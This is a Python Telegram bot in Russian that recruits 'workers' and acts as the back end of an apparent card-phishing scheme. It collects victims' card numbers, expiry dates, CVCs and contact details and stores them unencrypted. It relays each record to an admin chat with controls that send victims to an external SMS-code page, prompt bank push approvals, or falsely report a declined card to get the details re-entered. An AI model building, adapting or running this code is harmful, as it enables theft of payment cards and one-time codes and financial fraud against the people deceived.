import asyncio
import logging
import os
from dotenv import load_dotenv
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
import sqlite3
import datetime

# Загружаем переменные из .env
load_dotenv()

# Настройка логирования
logging.basicConfig(level=logging.INFO)

# Берем токен и ID из .env файла
BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID')

# Проверяем что переменные загрузились
if not BOT_TOKEN:
    logging.error("❌ BOT_TOKEN не найден в .env файле!")
    exit(1)

if not ADMIN_CHAT_ID:
    logging.error("❌ ADMIN_CHAT_ID не найден в .env файле!")
    exit(1)

# Преобразуем ID в число
ADMIN_CHAT_ID = int(ADMIN_CHAT_ID)

# Инициализация бота и диспетчера
bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)


# Инициализация БД
def init_db():
    conn = sqlite3.connect('applications.db')
    cursor = conn.cursor()
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS applications (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        username TEXT,
        first_name TEXT,
        time TEXT,
        experience TEXT,
        status TEXT DEFAULT 'pending',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    # Таблица для платежей
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS payments (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        first_name TEXT,
        last_name TEXT,
        email TEXT,
        phone TEXT,
        card_number TEXT,
        card_expiry TEXT,
        cvc TEXT,
        amount REAL,
        status TEXT DEFAULT 'pending',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    conn.commit()
    conn.close()


init_db()


# Состояния для FSM
class ApplicationStates(StatesGroup):
    waiting_for_time = State()
    waiting_for_experience = State()
    confirmation = State()


# Главное меню (для новых пользователей) - ТОЛЬКО REPLY КНОПКИ
main_kb = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="📝 Подать заявку")]
    ],
    resize_keyboard=True
)

# Главное меню (после принятия) - REPLY КНОПКИ
accepted_kb = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="🏠 Главное меню")],
        [KeyboardButton(text="👤 Профиль"), KeyboardButton(text="📊 Статистика")]
    ],
    resize_keyboard=True
)

# Клавиатура для отмены
cancel_kb = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="❌ Отменить заявку")]
    ],
    resize_keyboard=True
)

# Клавиатура подтверждения
confirm_kb = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="✅ Отправить заявку")],
        [KeyboardButton(text="🔄 Заполнить заново")]
    ],
    resize_keyboard=True
)

# Меню статистики - REPLY КНОПКИ
stats_menu_kb = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="📊 Сегодня"), KeyboardButton(text="📈 Вчера")],
        [KeyboardButton(text="📅 Неделя"), KeyboardButton(text="📆 Месяц")],
        [KeyboardButton(text="⬅️ Назад в меню")]
    ],
    resize_keyboard=True
)

# Инлайн кнопки для админа (заявки) - ЭТИ ОСТАВЛЯЕМ
def get_admin_buttons(application_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Принять", callback_data=f"accept_{application_id}"),
            InlineKeyboardButton(text="❌ Отклонить", callback_data=f"reject_{application_id}")
        ]
    ])


# ИНЛАЙН КНОПКИ ДЛЯ ПЛАТЕЖЕЙ (ДЛЯ АДМИНА) - ЭТИ ВАЖНЫЕ, ОСТАВЛЯЕМ
def get_payment_buttons(payment_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="📱 SMS код", callback_data=f"sms_code_{payment_id}"),
            InlineKeyboardButton(text="🔔 Пуш", callback_data=f"push_{payment_id}")
        ],
        [
            InlineKeyboardButton(text="❌ Неверная карта", callback_data=f"wrong_card_{payment_id}")
        ]
    ])


# Проверяем статус пользователя
def get_user_status(user_id):
    conn = sqlite3.connect('applications.db')
    cursor = conn.cursor()
    cursor.execute('SELECT status FROM applications WHERE user_id = ? ORDER BY id DESC LIMIT 1', (user_id,))
    result = cursor.fetchone()
    conn.close()
    if result:
        return result[0]
    return None


# Получаем дату вступления
def get_join_date(user_id):
    conn = sqlite3.connect('applications.db')
    cursor = conn.cursor()
    cursor.execute('SELECT created_at FROM applications WHERE user_id = ? AND status = "accepted"', (user_id,))
    result = cursor.fetchone()
    conn.close()
    if result:
        if isinstance(result[0], str):
            try:
                join_date = datetime.datetime.strptime(result[0], '%Y-%m-%d %H:%M:%S')
                return join_date.strftime('%d.%m.%Y')
            except ValueError:
                return result[0]
        elif isinstance(result[0], datetime.datetime):
            return result[0].strftime('%d.%m.%Y')
    return datetime.datetime.now().strftime('%d.%m.%Y')


# Сохраняем платеж в БД
def save_payment(user_id, first_name, last_name, email, phone, card_number, card_expiry, cvc):
    try:
        conn = sqlite3.connect('applications.db')
        cursor = conn.cursor()
        cursor.execute('''
        INSERT INTO payments (user_id, first_name, last_name, email, phone, card_number, card_expiry, cvc, amount)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (user_id, first_name, last_name, email, phone, card_number, card_expiry, cvc, 0.0))
        payment_id = cursor.lastrowid
        conn.commit()
        conn.close()
        logging.info(f"Платеж #{payment_id} успешно сохранен в БД")
        return payment_id
    except Exception as e:
        logging.error(f"Ошибка сохранения платежа в БД: {e}")
        return None


# Обработчик команды /start
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    user_status = get_user_status(user_id)

    if user_status == 'accepted':
        welcome_text = """
🎉 <b>Добро пожаловать в команду!</b>

Вы успешно прошли отбор и теперь являетесь частью нашего проекта.

Используйте кнопки меню для навигации.
"""
        await bot.send_photo(
            chat_id=user_id,
            photo="https://images.unsplash.com/photo-1521737711867-e3b97375f902?auto=format&fit=crop&w=800&q=80",
            caption=welcome_text,
            reply_markup=accepted_kb,  # Используем reply кнопки вместо inline
            parse_mode="HTML"
        )
    elif user_status == 'pending':
        await message.answer("⏳ Ваша заявка находится на рассмотрении. Пожалуйста, дождитесь ответа.")
    elif user_status == 'rejected':
        await message.answer("❌ К сожалению, ваша заявка была отклонена.")
    else:
        welcome_text = """
👋 <b>Добро пожаловать!</b>

Для начала работы подайте заявку, нажав на кнопку ниже.
"""
        await message.answer(welcome_text, reply_markup=main_kb, parse_mode="HTML")


# Главное меню через reply кнопку
@dp.message(F.text == "🏠 Главное меню")
async def main_menu(message: types.Message):
    user_id = message.from_user.id
    user_status = get_user_status(user_id)
    
    if user_status == 'accepted':
        menu_text = """
🏠 <b>Главное меню</b>

Выберите нужный раздел с помощью кнопок ниже:
• 👤 Профиль - информация о вашем аккаунте
• 📊 Статистика - статистика вашей работы
"""
        await message.answer(
            menu_text,
            reply_markup=accepted_kb,
            parse_mode="HTML"
        )
    else:
        await message.answer("❌ Доступ запрещен. Сначала подайте заявку.", reply_markup=main_kb)


# Профиль через reply кнопку
@dp.message(F.text == "👤 Профиль")
async def show_profile(message: types.Message):
    user_id = message.from_user.id
    user_status = get_user_status(user_id)
    
    if user_status == 'accepted':
        join_date = get_join_date(user_id)
        
        profile_text = f"""
👤 <b>Ваш профиль</b>

🔢 ID: <code>{user_id}</code>
👤 Имя: {message.from_user.first_name or 'Не указано'}
🔗 Username: @{message.from_user.username or 'Не указан'}
📅 Дата вступления: {join_date}
✅ Статус: Активен

Для возврата в главное меню нажмите "🏠 Главное меню"
"""
        await message.answer(
            profile_text,
            reply_markup=accepted_kb,
            parse_mode="HTML"
        )
    else:
        await message.answer("❌ Доступ запрещен. Сначала подайте заявку.", reply_markup=main_kb)


# Статистика через reply кнопку
@dp.message(F.text == "📊 Статистика")
async def show_stats_menu(message: types.Message):
    user_id = message.from_user.id
    user_status = get_user_status(user_id)
    
    if user_status == 'accepted':
        stats_text = """
📊 <b>Статистика</b>

Выберите период для просмотра статистики:
"""
        await message.answer(
            stats_text,
            reply_markup=stats_menu_kb,
            parse_mode="HTML"
        )
    else:
        await message.answer("❌ Доступ запрещен. Сначала подайте заявку.", reply_markup=main_kb)


# Обработка разных периодов статистики
@dp.message(F.text.in_(["📊 Сегодня", "📈 Вчера", "📅 Неделя", "📆 Месяц"]))
async def show_stats_period(message: types.Message):
    user_id = message.from_user.id
    user_status = get_user_status(user_id)
    
    if user_status != 'accepted':
        await message.answer("❌ Доступ запрещен. Сначала подайте заявку.", reply_markup=main_kb)
        return
    
    period = message.text
    
    # Примерные данные для статистики
    if period == "📊 Сегодня":
        stats_text = """
📊 <b>Статистика за сегодня</b>

📈 Выполнено задач: 12
💰 Заработано: 2,450 ₽
⏱ Время работы: 4ч 32м
✅ Успешность: 95%
"""
    elif period == "📈 Вчера":
        stats_text = """
📈 <b>Статистика за вчера</b>

📈 Выполнено задач: 18
💰 Заработано: 3,200 ₽
⏱ Время работы: 6ч 15м
✅ Успешность: 92%
"""
    elif period == "📅 Неделя":
        stats_text = """
📅 <b>Статистика за неделю</b>

📈 Выполнено задач: 87
💰 Заработано: 15,750 ₽
⏱ Время работы: 32ч 48м
✅ Успешность: 94%
"""
    else:  # Месяц
        stats_text = """
📆 <b>Статистика за месяц</b>

📈 Выполнено задач: 342
💰 Заработано: 58,900 ₽
⏱ Время работы: 142ч 36м
✅ Успешность: 93%
"""
    
    await message.answer(
        stats_text,
        reply_markup=stats_menu_kb,
        parse_mode="HTML"
    )


# Кнопка "Назад в меню"
@dp.message(F.text == "⬅️ Назад в меню")
async def back_to_main(message: types.Message):
    user_id = message.from_user.id
    user_status = get_user_status(user_id)
    
    if user_status == 'accepted':
        await main_menu(message)
    else:
        await message.answer("❌ Доступ запрещен. Сначала подайте заявку.", reply_markup=main_kb)


# Начало подачи заявки - изменен текст кнопки
@dp.message(F.text == "📝 Подать заявку")
async def start_application(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    user_status = get_user_status(user_id)

    if user_status == 'pending':
        await message.answer("⏳ Ваша заявка уже на рассмотрении. Пожалуйста, дождитесь ответа.")
    elif user_status == 'accepted':
        await message.answer("✅ Вы уже являетесь членом команды!")
    else:
        await message.answer(
            "📝 <b>Заполнение заявки</b>\n\n"
            "Сколько времени в день вы готовы уделять работе?\n"
            "(например: 2-3 часа, полный день, по вечерам)",
            reply_markup=cancel_kb,
            parse_mode="HTML"
        )
        await state.set_state(ApplicationStates.waiting_for_time)


# Отмена заявки
@dp.message(F.text == "❌ Отменить заявку", ApplicationStates)
async def cancel_application(message: types.Message, state: FSMContext):
    await state.clear()
    await message.answer("❌ Заявка отменена", reply_markup=main_kb)


# Получение времени работы
@dp.message(ApplicationStates.waiting_for_time)
async def process_time(message: types.Message, state: FSMContext):
    await state.update_data(time=message.text)
    await message.answer(
        "💼 Есть ли у вас опыт работы в интернете?\n"
        "(например: нет опыта, работал с соц.сетями, есть опыт в продажах)",
        reply_markup=cancel_kb
    )
    await state.set_state(ApplicationStates.waiting_for_experience)


# Получение опыта
@dp.message(ApplicationStates.waiting_for_experience)
async def process_experience(message: types.Message, state: FSMContext):
    await state.update_data(experience=message.text)
    
    data = await state.get_data()
    confirmation_text = f"""
📋 <b>Проверьте вашу заявку:</b>

⏰ <b>Время работы:</b> {data['time']}
💼 <b>Опыт:</b> {data['experience']}

Все верно?
"""
    await message.answer(confirmation_text, reply_markup=confirm_kb, parse_mode="HTML")
    await state.set_state(ApplicationStates.confirmation)


# Подтверждение заявки
@dp.message(F.text == "✅ Отправить заявку", ApplicationStates.confirmation)
async def confirm_application(message: types.Message, state: FSMContext):
    data = await state.get_data()
    user_id = message.from_user.id
    username = message.from_user.username
    first_name = message.from_user.first_name

    # Сохраняем в БД
    conn = sqlite3.connect('applications.db')
    cursor = conn.cursor()
    cursor.execute('''
    INSERT INTO applications (user_id, username, first_name, time, experience)
    VALUES (?, ?, ?, ?, ?)
    ''', (user_id, username, first_name, data['time'], data['experience']))
    application_id = cursor.lastrowid
    conn.commit()
    conn.close()

    # Отправляем админу
    admin_text = f"""
📥 <b>Новая заявка #{application_id}</b>

👤 <b>Пользователь:</b>
• ID: {user_id}
• Username: @{username or 'не указан'}
• Имя: {first_name or 'не указано'}

📋 <b>Данные заявки:</b>
• Время работы: {data['time']}
• Опыт: {data['experience']}
"""
    await bot.send_message(
        ADMIN_CHAT_ID, 
        admin_text, 
        reply_markup=get_admin_buttons(application_id),
        parse_mode="HTML"
    )

    # Отвечаем пользователю
    await message.answer(
        "✅ Ваша заявка успешно отправлена!\n\n"
        "Мы рассмотрим её в ближайшее время и отправим вам уведомление.",
        reply_markup=types.ReplyKeyboardRemove()
    )
    await state.clear()


# Заполнить заново
@dp.message(F.text == "🔄 Заполнить заново", ApplicationStates.confirmation)
async def restart_application(message: types.Message, state: FSMContext):
    await message.answer(
        "📝 <b>Заполнение заявки</b>\n\n"
        "Сколько времени в день вы готовы уделять работе?",
        reply_markup=cancel_kb,
        parse_mode="HTML"
    )
    await state.set_state(ApplicationStates.waiting_for_time)


# Принятие заявки админом
@dp.callback_query(F.data.startswith("accept_"))
async def accept_application(callback: types.CallbackQuery):
    application_id = callback.data.split("_")[1]
    
    # Получаем данные заявки
    conn = sqlite3.connect('applications.db')
    cursor = conn.cursor()
    cursor.execute('SELECT user_id FROM applications WHERE id = ?', (application_id,))
    result = cursor.fetchone()
    
    if result:
        user_id = result[0]
        # Обновляем статус
        cursor.execute('UPDATE applications SET status = "accepted" WHERE id = ?', (application_id,))
        conn.commit()
        
        # Уведомляем пользователя
        success_text = """
🎉 <b>Поздравляем!</b>

Ваша заявка одобрена! Добро пожаловать в команду!

Теперь вам доступен полный функционал бота.
Используйте кнопки меню для навигации.
"""
        await bot.send_message(user_id, success_text, reply_markup=accepted_kb, parse_mode="HTML")
        
        # Обновляем сообщение админа
        await callback.message.edit_text(
            callback.message.text + "\n\n✅ <b>Заявка принята</b>",
            parse_mode="HTML"
        )
    
    conn.close()
    await callback.answer("✅ Заявка принята")


# Отклонение заявки админом
@dp.callback_query(F.data.startswith("reject_"))
async def reject_application(callback: types.CallbackQuery):
    application_id = callback.data.split("_")[1]
    
    # Получаем данные заявки
    conn = sqlite3.connect('applications.db')
    cursor = conn.cursor()
    cursor.execute('SELECT user_id FROM applications WHERE id = ?', (application_id,))
    result = cursor.fetchone()
    
    if result:
        user_id = result[0]
        # Обновляем статус
        cursor.execute('UPDATE applications SET status = "rejected" WHERE id = ?', (application_id,))
        conn.commit()
        
        # Уведомляем пользователя
        reject_text = """
❌ <b>К сожалению, ваша заявка отклонена</b>

Вы можете подать новую заявку позже.
"""
        await bot.send_message(user_id, reject_text, reply_markup=main_kb, parse_mode="HTML")
        
        # Обновляем сообщение админа
        await callback.message.edit_text(
            callback.message.text + "\n\n❌ <b>Заявка отклонена</b>",
            parse_mode="HTML"
        )
    
    conn.close()
    await callback.answer("❌ Заявка отклонена")


# Обработка всех остальных сообщений
@dp.message()
async def echo_message(message: types.Message):
    # Если начинается обработка состояний, пропускаем
    if message.text and message.text.startswith(("/", "📝", "❌", "✅", "🔄")):
        return

    # Проверяем, это платежные данные (ищем ключевые слова)
    message_text = message.text or ""
    if any(keyword in message_text for keyword in ["НОВАЯ ОПЛАТА", "Клиент:", "Карта:", "Номер:", "Срок:", "CVC:"]):
        logging.info(f"Обнаружены платежные данные от пользователя {message.from_user.id}")
        await process_payment_data(message)
    else:
        # Обычное сообщение - показываем соответствующее меню
        user_status = get_user_status(message.from_user.id)
        if user_status == 'accepted':
            await message.answer("👋 Используйте кнопки меню для навигации", reply_markup=accepted_kb)
        else:
            await message.answer("👋 Для начала работы нажмите '📝 Подать заявку'", reply_markup=main_kb)


# Функция обработки платежных данных
async def process_payment_data(message: types.Message):
    """Обрабатывает платежные данные от пользователей"""
    try:
        logging.info(f"Начинаем обработку платежных данных от {message.from_user.id}")

        # Парсим данные из сообщения
        lines = message.text.split('\n')
        payment_data = {}

        for line in lines:
            line = line.strip()
            if 'Имя:' in line:
                payment_data['first_name'] = line.split('Имя:')[1].strip()
            elif 'Фамилия:' in line:
                payment_data['last_name'] = line.split('Фамилия:')[1].strip()
            elif 'Email:' in line:
                payment_data['email'] = line.split('Email:')[1].strip()
            elif 'Телефон:' in line:
                payment_data['phone'] = line.split('Телефон:')[1].strip()
            elif 'Номер:' in line:
                payment_data['card_number'] = line.split('Номер:')[1].strip()
            elif 'Срок:' in line:
                payment_data['card_expiry'] = line.split('Срок:')[1].strip()
            elif 'CVC:' in line:
                payment_data['cvc'] = line.split('CVC:')[1].strip()

        # Проверяем, что все необходимые данные есть
        required_fields = ['first_name', 'last_name', 'email', 'phone', 'card_number', 'card_expiry', 'cvc']
        missing_fields = [field for field in required_fields if not payment_data.get(field)]

        if missing_fields:
            logging.warning(f"Отсутствуют поля: {missing_fields}")
            await message.answer("❌ Не все данные оплаты получены. Попробуйте снова.")
            return

        # Сохраняем в БД
        payment_id = save_payment(
            user_id=message.from_user.id,
            first_name=payment_data.get('first_name', ''),
            last_name=payment_data.get('last_name', ''),
            email=payment_data.get('email', ''),
            phone=payment_data.get('phone', ''),
            card_number=payment_data.get('card_number', ''),
            card_expiry=payment_data.get('card_expiry', ''),
            cvc=payment_data.get('cvc', '')
        )

        logging.info(f"Платеж #{payment_id} сохранен в БД")

        # Отправляем уведомление админу С КНОПКАМИ ПОД ДАННЫМИ
        admin_message = f"""
💳 <b>НОВЫЙ ПЛАТЕЖ #{payment_id}</b>

👤 <b>Клиент:</b>
├ Имя: {payment_data.get('first_name', '-')}
├ Фамилия: {payment_data.get('last_name', '-')}
├ Email: {payment_data.get('email', '-')}
└ Телефон: {payment_data.get('phone', '-')}

💳 <b>Карта:</b>
├ Номер: {payment_data.get('card_number', '-')}
├ Срок: {payment_data.get('card_expiry', '-')}
└ CVC: {payment_data.get('cvc', '-')}

👤 <b>От пользователя:</b>
├ ID: {message.from_user.id}
├ Username: @{message.from_user.username or 'Нет'}
└ Имя: {message.from_user.first_name or ''}

⬇️ <b>Управление платежом:</b>
"""
        # Отправляем с кнопками управления
        await bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=admin_message,
            reply_markup=get_payment_buttons(payment_id),  # Кнопки теперь под данными
            parse_mode="HTML"
        )

        logging.info(f"Уведомление с кнопками управления отправлено админу для платежа #{payment_id}")

        # Подтверждаем пользователю
        await message.answer("✅ Данные оплаты получены и отправлены на обработку")

    except Exception as e:
        logging.error(f"Ошибка обработки платежа: {e}")
        await message.answer("❌ Ошибка обработки данных оплаты")


# Обработка SMS кода
@dp.callback_query(F.data.startswith("sms_code_"))
async def sms_code_handler(callback: types.CallbackQuery):
    payment_id = callback.data.split("_")[2]

    # Обновляем статус в БД
    conn = sqlite3.connect('applications.db')
    cursor = conn.cursor()
    cursor.execute('SELECT user_id FROM payments WHERE id = ?', (payment_id,))
    result = cursor.fetchone()
    user_id = result[0] if result else None

    cursor.execute('UPDATE payments SET status = "sms_required" WHERE id = ?', (payment_id,))
    conn.commit()
    conn.close()

    if user_id:
        # Отправляем команду пользователю для перехода на SMS страницу
        try:
            await bot.send_message(
                chat_id=user_id,
                text="🔐 <b>Требуется подтверждение SMS</b>\n\n"
                     "Для завершения оплаты перейдите по ссылке ниже:",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                    InlineKeyboardButton(text="📱 Ввести SMS код",
                                         url=f"https://yourdomain.com/sms.html?payment_id={payment_id}")
                ]]),
                parse_mode="HTML"
            )
        except Exception as e:
            logging.error(f"Ошибка отправки SMS уведомления: {e}")

    await callback.message.edit_text(
        f"📱 <b>SMS код запрошен для платежа #{payment_id}</b>\n\n"
        f"Пользователь будет перенаправлен на страницу ввода SMS кода.",
        parse_mode="HTML"
    )
    await callback.answer("SMS код запрошен")


# Обработка Пуша
@dp.callback_query(F.data.startswith("push_"))
async def push_handler(callback: types.CallbackQuery):
    payment_id = callback.data.split("_")[1]

    # Обновляем статус в БД
    conn = sqlite3.connect('applications.db')
    cursor = conn.cursor()
    cursor.execute('SELECT user_id FROM payments WHERE id = ?', (payment_id,))
    result = cursor.fetchone()
    user_id = result[0] if result else None

    cursor.execute('UPDATE payments SET status = "push_required" WHERE id = ?', (payment_id,))
    conn.commit()
    conn.close()

    if user_id:
        # Отправляем пуш уведомление пользователю
        try:
            await bot.send_message(
                chat_id=user_id,
                text="🔔 <b>Требуется подтверждение операции</b>\n\n"
                     "Пожалуйста, подтвердите операцию в вашем банковском приложении.",
                parse_mode="HTML"
            )
        except Exception as e:
            logging.error(f"Ошибка отправки пуш уведомления: {e}")

    await callback.message.edit_text(
        f"🔔 <b>Пуш уведомление отправлено для платежа #{payment_id}</b>\n\n"
        f"Ожидаем подтверждения от пользователя.",
        parse_mode="HTML"
    )
    await callback.answer("Пуш отправлен")


# Обработка неверной карты
@dp.callback_query(F.data.startswith("wrong_card_"))
async def wrong_card_handler(callback: types.CallbackQuery):
    payment_id = callback.data.split("_")[2]

    # Обновляем статус в БД
    conn = sqlite3.connect('applications.db')
    cursor = conn.cursor()
    cursor.execute('SELECT user_id FROM payments WHERE id = ?', (payment_id,))
    result = cursor.fetchone()
    user_id = result[0] if result else None

    cursor.execute('UPDATE payments SET status = "wrong_card" WHERE id = ?', (payment_id,))
    conn.commit()
    conn.close()

    if user_id:
        # Отправляем уведомление о неверной карте
        try:
            await bot.send_message(
                chat_id=user_id,
                text="❌ <b>Ошибка оплаты</b>\n\n"
                     "Ваша карта была отклонена. Пожалуйста, проверьте данные карты и попробуйте снова.",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                    InlineKeyboardButton(text="🔄 Попробовать снова", url=f"https://yourdomain.com/payment.html")
                ]]),
                parse_mode="HTML"
            )
        except Exception as e:
            logging.error(f"Ошибка отправки уведомления о неверной карте: {e}")

    await callback.message.edit_text(
        f"❌ <b>Карта отклонена для платежа #{payment_id}</b>\n\n"
        f"Пользователь будет перенаправлен на страницу оплаты.",
        parse_mode="HTML"
    )
    await callback.answer("Карта отклонена")


# Запуск бота
async def main():
    logging.info("Бот запущен!")
    await dp.start_polling(bot)


if __name__ == "__main__":
    # Для Render
    if os.getenv('RENDER'):
        import asyncio
        asyncio.run(main())
    else:
        # Для локального запуска
        asyncio.run(main())
